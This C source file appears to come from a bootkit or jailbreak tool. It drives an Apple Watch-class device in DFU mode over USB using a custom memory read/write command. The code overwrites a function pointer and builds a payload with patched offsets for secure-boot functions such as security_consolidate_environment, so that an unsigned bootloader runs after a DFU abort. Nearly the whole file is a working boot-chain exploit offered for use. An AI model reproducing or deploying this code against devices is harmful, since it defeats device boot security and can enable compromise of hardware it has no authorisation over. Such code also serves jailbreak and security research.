#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include "libbootkit.h"
#include "config_watch.h"
#include "payload_watch.h"
#include "common.c" // I am the bad guy

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t magic2;
#define USB_COMMAND_MEM_MAGIC 'memc'
    uint8_t padding[8];
    uint32_t dest_ptr;
    uint32_t src_ptr;
    uint32_t length;
    uint8_t data[];
} usb_command_memc_t;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t magic2;
#define USB_COMMAND_DONE_MAGIC 'done'
    uint8_t padding[8];
    uint8_t data[];
} usb_command_done_t;

const config_watch_t *get_config_watch(uint32_t cpid) {
    for (int i = 0; i < sizeof(configs_watch) / sizeof(config_watch_t); i++) {
        const config_watch_t *config = &configs_watch[i];
        if (config->cpid == cpid)
            return config;
    }

    return NULL;
}

static int read_mem32(irecv_client_t client, const config_watch_t *config, uint32_t address, uint32_t *dest) {
    printf("reading 32-bits from 0x%x...\n", address);

    usb_command_memc_t command;
    command.magic  = USB_COMMAND_MEM_MAGIC;
    command.magic2 = USB_COMMAND_MEM_MAGIC;
    memset(&command.padding, 0, sizeof(command.padding));
    command.dest_ptr = config->loadaddr + sizeof(usb_command_done_t);
    command.src_ptr = address;
    command.length = sizeof(uint32_t);

    if (send_command(client, (unsigned char*)&command, sizeof(command)) != 0) {
        printf("ERROR: failed to send command\n");
        return -1;
    }

    unsigned char buffer[sizeof(usb_command_done_t) + sizeof(uint32_t)];
    usb_command_done_t *done = (usb_command_done_t *)buffer;

    if (trigger_command(client, (unsigned char*)&buffer, sizeof(buffer)) != sizeof(buffer)) {
        printf("ERROR: failed to receive data\n");
        return -1;
    }

    if (done->magic != USB_COMMAND_DONE_MAGIC || done->magic2 != USB_COMMAND_DONE_MAGIC) {
        printf("ERROR: invalid response from device\n");
        return -1;
    }

    *dest = *(uint32_t *)done->data;

    return 0;
}

static int write_mem32(irecv_client_t client, const config_watch_t *config, uint32_t address, uint32_t value) {
    printf("writing 0x%x to 0x%x...\n", value, address);

    unsigned char buffer[sizeof(usb_command_memc_t) + sizeof(uint32_t)];

    usb_command_memc_t *command = (usb_command_memc_t *)buffer;
    command->magic  = USB_COMMAND_MEM_MAGIC;
    command->magic2 = USB_COMMAND_MEM_MAGIC;
    memset(&command->padding, 0, sizeof(command->padding));
    command->dest_ptr = address;
    command->src_ptr = config->loadaddr + offsetof(usb_command_memc_t, data);
    command->length = sizeof(uint32_t);
    *(uint32_t *)&command->data = value;

    if (send_command(client, (unsigned char*)&buffer, sizeof(buffer)) != 0) {
        printf("ERROR: failed to send command\n");
        return -1;
    }
    
    trigger_command(client, NULL, 0);

    uint32_t verify = 0;

    if (read_mem32(client, config, address, &verify) != 0) {
        printf("ERROR: failed to re-read value\n");
        return -1;
    }

    if (verify != value) {
        printf("ERROR: re-read value doesn't match with requested one\n");
        return -1;
    }

    return 0;
}

typedef struct __attribute__((packed)) {
    uint32_t loadaddr;
    uint32_t security_consolidate_environment;
    uint32_t security_sidp_seal_rom_manifest;
    uint32_t platform_get_boot_trampoline;
    uint32_t platform_bootprep;
    uint32_t usb_controller_stop;
    uint32_t interrupt_mask_all;
    uint32_t timer_stop_all;
    uint32_t clocks_quiesce;
    uint32_t enter_critical_section;
    uint32_t arch_cpu_quiesce;
} payload_offsets_t;

static unsigned char *construct_payload(const config_watch_t *config) {
    printf("constructing payload...\n");
    
    unsigned char *payload_copy = malloc(sizeof(payload_watch));
    if (!payload_copy) {
        printf("ERROR: out of memory\n");
        return NULL;
    }

    memmove(payload_copy, &payload_watch, sizeof(payload_watch));

    static const uint32_t magic = 0xDEAD0001;
    
    unsigned char *offset = memmem(payload_copy, sizeof(payload_watch), &magic, sizeof(magic));
    if (!offset) {
        goto improper_payload;
    }

    if (sizeof(payload_watch) - (size_t)(offset - payload_copy) < sizeof(payload_offsets_t)) {
        goto improper_payload;
    }

    payload_offsets_t *payload_offsets = (payload_offsets_t *)offset;

    payload_offsets->loadaddr = config->loadaddr;
    payload_offsets->security_consolidate_environment = config->security_consolidate_environment;
    payload_offsets->security_sidp_seal_rom_manifest = config->security_sidp_seal_rom_manifest;
    payload_offsets->platform_get_boot_trampoline = config->platform_get_boot_trampoline;
    payload_offsets->platform_bootprep = config->platform_bootprep;
    payload_offsets->usb_controller_stop = config->usb_controller_stop;
    payload_offsets->interrupt_mask_all = config->interrupt_mask_all;
    payload_offsets->timer_stop_all = config->timer_stop_all;
    payload_offsets->clocks_quiesce = config->clocks_quiesce;
    payload_offsets->enter_critical_section = config->enter_critical_section;
    payload_offsets->arch_cpu_quiesce = config->arch_cpu_quiesce;

    goto success;

improper_payload:
    free(payload_copy);
    printf("ERROR: improper payload\n");
    return NULL;

success:
    return payload_copy;
}

static int construct_command(irecv_client_t client,
                      const config_watch_t *config,
                      const char *bootloader,
                      size_t bootloader_length,
                      unsigned char **result,
                      size_t *result_length) {

    printf("constructing command...\n");

    if (*(uint32_t*)bootloader != ARM_RESET_VECTOR) {
        printf("ERROR: provided bootloader doesn't seem to be an ARM image\n");
        return -1;
    }

    size_t command_length = sizeof(payload_watch) + bootloader_length;

    if (command_length > config->loadsize) {
        printf("ERROR: resulting command is too big, use smaller bootloader (at least %lu smaller)\n", command_length - config->loadsize);
        return -1;
    }

    unsigned char *buffer = malloc(command_length);
    if (!buffer) {
        printf("ERROR: out of memory");
        return -1;
    }

    memset(buffer, 0x0, command_length);
    memmove(buffer, bootloader, bootloader_length);

    unsigned char *prepared_payload = construct_payload(config);

    if (!prepared_payload) {
        printf("ERROR: failed to construct payload\n");
        free(buffer);
        return -1;
    }

    memmove(buffer + bootloader_length, prepared_payload, sizeof(payload_watch));

    free((void*)prepared_payload);

    *result = buffer;
    *result_length = command_length;

    return 0;
}

int dfu_boot_watch(irecv_client_t client, const char *bootloader, size_t bootloader_length, bool debug) {
    if (validate_device(client) != 0) {
        printf("ERROR: device validation failed\n");
        return -1;
    }

    const struct irecv_device_info *info = irecv_get_device_info(client);
    const config_watch_t *config = get_config_watch(info->cpid);
    if (!config) {
        printf("ERROR: no config available for CPID:%04X\n", info->cpid);
        return -1;
    }

    unsigned char *command;
    size_t command_length;

    if (construct_command(client, config, bootloader, bootloader_length, &command, &command_length) != 0) {
        printf("ERROR: failed to construct command\n");
        return -1;
    }

    if (debug) {
        int ret = save_command(client, command, command_length);
        irecv_close(client);
        return ret;
    }

    if (write_mem32(client, config, config->func_ptr, config->loadaddr + bootloader_length + 1) != 0) {
        printf("ERROR: failed to overwrite function pointer\n");
        return -1;
    }

    if (send_command(client, command, command_length) != 0) {
        printf("ERROR: failed to send command\n");
        return -1;
    }

    printf("requesting DFU abort\n");

    irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, USB_SMALL_TIMEOUT);

    return 0;
}
